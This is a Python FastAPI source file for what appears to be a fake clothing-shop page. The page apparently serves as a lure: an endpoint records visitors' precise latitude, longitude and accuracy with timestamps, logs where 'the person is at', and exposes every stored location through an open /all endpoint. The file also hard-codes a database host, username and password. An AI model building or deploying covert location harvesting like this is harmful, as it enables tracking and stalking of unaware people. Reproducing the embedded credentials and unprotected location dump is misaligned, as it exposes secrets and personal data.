from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from pydantic import BaseModel
from datetime import datetime
import psycopg2
import os
import pytz


# Set up app
app = FastAPI()
app.mount("/static", StaticFiles(directory="static"), name="static")
templates = Jinja2Templates(directory="templates")

# Location model
class Location(BaseModel):
    latitude: float
    longitude: float
    accuracy :float

# PostgreSQL connection
try:
    print("📱 Connecting to PostgreSQL DB...")
    db = psycopg2.connect(
        host="dpg-d1fbfsfgi27c73ckorkg-a",
        user="location_1698_user",
        password="Scmgt1Keu8Y4SgFsoTM0OVG6PKAUg1Hu",
        dbname="location_1698",
        port=5432
    )

    cursor = db.cursor()
    print("🛠️ Creating table if not exists...")
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS locationst (
            id SERIAL PRIMARY KEY,
            latitude DOUBLE PRECISION NOT NULL,
            longitude DOUBLE PRECISION NOT NULL,
            accuracy  DOUBLE PRECISION NOT NULL,
            timestamp TIMESTAMP NOT NULL
        )
    """)
    db.commit()
    print("✅ DB setup complete")
except Exception as e:
    print("❌ DB connection error:", e)
    db = None

@app.get("/", response_class=HTMLResponse)
async def home(request: Request):
    print("📥 GET request to /")
    shirts = [
        {"name": "Black Tee", "price": "₹499", "link": "/"},
        {"name": "White Polo", "price": "₹699", "link": "/"},
        {"name": "Red Hoodie", "price": "₹999", "link": "https://dl.flipkart.com/dl/jqr-global-sports-shoes-walking-lightweight-trekking-stylish-running-shoes-men/p/itmc7cb726b5bde2?pid=SHOGHZNUCYZWEMHN&marketplace=FLIPKART&cmpid=product.share.pp&_refId=PP.1d7a4717-8376-4623-b02e-3c7fdd432e7c.SHOGHZNUCYZWEMHN&_appId=com.instagram.android"}
    ]
    return templates.TemplateResponse("index.html", {"request": request, "shirts": shirts})

@app.get("/all")
async def get_all():
    print("📥 GET request to /all")
    try:
        cursor.execute("SELECT * FROM locationst")
        rows = cursor.fetchall()

        india_tz = pytz.timezone("Asia/Kolkata")
        results = [
            {
                "id": row[0],
                "latitude": row[1],
                "longitude": row[2],
                "accuracy": row[3],
                "time": row[4].astimezone(india_tz).strftime("%d %B %Y, %I:%M %p")
            } for row in rows
        ]

        print("📦 Fetched records:", results)
        return results
    except Exception as e:
        print("❌ Error fetching data:", e)
        return {"error": str(e)}


@app.post("/location")
async def receive_location(location: Location):
    print("📥 POST request to /location")
    if db:
        try:
            india_tz = pytz.timezone("Asia/Kolkata")
            timestamp = datetime.now(india_tz)

            print("📦 Incoming location:", location)
            print("🕒 Timestamp (India):", timestamp.strftime("%d %B %Y, %I:%M %p"))

            cursor.execute("INSERT INTO locationst (latitude, longitude,accuracy ,timestamp) VALUES (%s, %s,%s,%s)", (location.latitude, location.longitude,location.accuracy,timestamp))
            db.commit()
            print("✅ Location saved to DB")
            cursor.execute("SELECT * FROM locationst ORDER BY id DESC LIMIT 1")
            results = cursor.fetchone()
            print("📦 Now The Person Is At:", results)
            return {"message": "Location saved ✅"}
        except Exception as e:
            print("❌ DB error on insert:", e)
            return {"error": str(e)}
    print("❌ DB not connected")
    return {"error": "DB not connected"}
